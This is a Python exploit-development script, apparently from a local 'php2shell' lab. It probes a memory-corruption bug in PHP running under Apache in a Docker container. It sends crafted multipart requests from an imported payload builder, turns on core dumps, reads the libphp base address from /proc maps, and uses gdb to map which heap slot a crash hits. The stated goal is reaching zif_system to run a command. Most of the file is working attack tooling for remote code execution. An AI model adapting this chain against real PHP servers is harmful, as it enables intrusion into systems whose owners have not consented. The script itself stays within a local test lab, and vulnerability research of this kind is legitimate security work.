#!/usr/bin/env python3
"""oom88: full-window marker map of the AIM arm -> aim the true slot.

Facts: AIM sacrifice (template tile) never crashes (3/3 silent, oom87).
AIM flow + marker@32 crashes (oom85). So in AIM arms the walk DOES reach
slot 32 area but the decrement at TARGET (valid, rc=1) never zeroed...

wait: oom86 silence at T[32]=TARGET means the walk may read a DIFFERENT
window per tile content. Definitive map: every 8-aligned slot gets its
own distinctive invalid marker (0x5a5a5a5a5a5a5a00 | slot). Crash rdi
names the exact slot. If MULTIPLE crashes: map them all.
Tile: AIM template + markers at ALL slots 0..168 step 8 (except none —
markers everywhere, this is a probe, not a weapon).
Flow: warm 9100000 + sacrifice@9200000 + finishers 9210000+4i (x8).
"""
import re
import struct
import subprocess
import sys
import time

sys.path.insert(0, '/Users/vlad/Projects/queue/php2shell-lab')
import payload68 as P

HOST = "http://127.0.0.1:8081/oom_sapi.php"
CMD = b"whoami>/tmp/x"
ZIF_SYSTEM = 0x39b8a0


def sh(c, t=120):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=t)
    return (r.stdout + r.stderr).strip()


def post(att):
    import urllib.request
    req = urllib.request.Request(
        HOST, data=att,
        headers={"Content-Type": "multipart/form-data; boundary=BOUND"})
    try:
        with urllib.request.urlopen(req, timeout=120) as r:
            return "200", r.read(300)
    except Exception as e:
        return "ERR", str(e)[:150].encode()


def boot_core_env():
    sh("docker exec php_vuln sh -c \"grep -q 'ulimit -c' /etc/apache2/envvars || echo 'ulimit -c unlimited' >> /etc/apache2/envvars\"")
    sh("docker exec php_vuln sh -c \"printf 'CoreDumpDirectory /tmp\\n' > /etc/apache2/conf-enabled/oomcore.conf\"")
    sh("docker exec php_vuln sh -c 'rm -f /tmp/core* /tmp/x'")
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
    for _ in range(40):
        time.sleep(1.5)
        if "lim=8M" in sh("curl -s -m 5 " + HOST, 10):
            break
    md5 = sh("docker exec php_vuln md5sum /usr/lib/apache2/modules/libphp.so | cut -d' ' -f1")
    assert md5 == P.STOCK_MD5, md5


def probe_tile():
    T = bytearray(176)
    for s in range(0, 176, 8):
        struct.pack_into("<Q", T, s, 0x5a5a5a5a5a5a5a00 | (s // 8))
    return bytes(T)


def fetch_core(tag):
    sh("docker cp php_vuln:/tmp/core /tmp/c88_%s" % tag, 240)
    sh("docker cp /tmp/c88_%s phpbuild:/tmp/c88_%s" % (tag, tag), 240)
    return "/tmp/c88_%s" % tag


def gdb_rdi(core_in_build):
    out = sh("docker exec phpbuild sh -c 'gdb -q -batch -ex \"info registers rdi\" /tmp/libphp.69.so /tmp/%s'" % core_in_build, 240)
    m = re.search(r"rdi\s+0x([0-9a-f]+)", out)
    return int(m.group(1), 16) if m else None


print("=== oom88: AIM-arm window map (unique markers all slots) ===", flush=True)
boot_core_env()
pid = sh("docker exec php_vuln pgrep -f 'apache2' | head -1").strip()
maps = sh("docker exec php_vuln cat /proc/%s/maps" % pid)
base = None
for ln in maps.splitlines():
    if "libphp.so" in ln and ln.split()[1].startswith("r"):
        base = int(ln.split()[0].split("-")[0], 16)
        break
print("    libphp=0x%x" % base, flush=True)

T = probe_tile()
print("[1] warm (11)", flush=True)
for i, k1 in enumerate(P.K1S[:-1]):
    post(P.build_attack(k1, 9100000 + i * 100000, value_tile=T))
print("[2] sacrifice@9200000 + finishers@9210000+4i (x8)", flush=True)
post(P.build_attack(3400, 9200000, value_tile=T))
found = []
for fi in range(8):
    sb = 9210000 + fi * 4
    code, resp = post(P.build_attack(3400, sb, value_tile=T))
    tag = "fatal" if b"Fatal" in resp else ("clean" if code == "200" else "crash")
    print("  fire%d (%d): %s [%s]" % (fi, sb, code, tag), flush=True)
    if code != "200":
        time.sleep(3)
        cb = fetch_core("f%d" % fi)
        rdi = gdb_rdi("c88_f%d" % fi)
        if rdi is not None:
            slot = (rdi & 0xFF) * 8
            clean = (rdi & ~0xFF) == 0x5a5a5a5a5a5a5a00
            print("    rdi=0x%x -> slot=%s valid=%s" % (rdi, slot if clean else "?", clean), flush=True)
            if clean:
                found.append(slot)
print("[MAP] crashes at slots: %s" % found, flush=True)

print("[3] restore", flush=True)
sh("docker exec php_vuln sh -c 'rm -f /etc/apache2/conf-enabled/oomcore.conf && sed -i \"/ulimit -c/d\" /etc/apache2/envvars'")
subprocess.run(["docker", "restart", "php_vuln"], capture_output=True)
time.sleep(8)
print("    restored:", sh("curl -s -m 5 " + HOST, 10), flush=True)
